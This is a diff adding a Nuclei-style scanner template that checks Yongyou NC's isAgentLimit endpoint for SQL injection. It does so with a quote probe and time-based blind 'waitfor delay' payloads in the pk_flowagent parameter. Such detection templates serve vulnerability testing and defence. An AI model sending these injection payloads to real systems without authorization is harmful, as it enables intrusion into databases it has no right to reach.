@@ -1,0 +1,52 @@
+id: poc-yaml-yongyou-nc-isagentlimit-sqli
+info:
+  name: "Yongyou NC isAgentLimit 接口存在 SQL 注入漏洞"
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: Yongyou NC
+  description: |
+    This template identifies an SQL injection vulnerability in the Yongyou NC application on the isAgentLimit endpoint.
+
+flow: |
+  http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET /portal/pt/oacoSchedulerEvents/isAgentLimit?pageId=login&pk_flowagent=1' HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "关键字 'null' 附近有语法错误"
+
+  - raw:
+      - |
+        GET /portal/pt/oacoSchedulerEvents/isAgentLimit?pageId=login&pk_flowagent=1'waitfor+delay+'0:0:5'-- HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        GET /portal/pt/oacoSchedulerEvents/isAgentLimit?pageId=login&pk_flowagent=1'waitfor+delay+'0:0:8'-- HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "<info>"
+          - "xml"
+      - type: dsl
+        dsl:
+          - 'duration_1>=5 && duration_1<=6'
+          - 'duration_2 - duration_1 >2'
+        condition: and
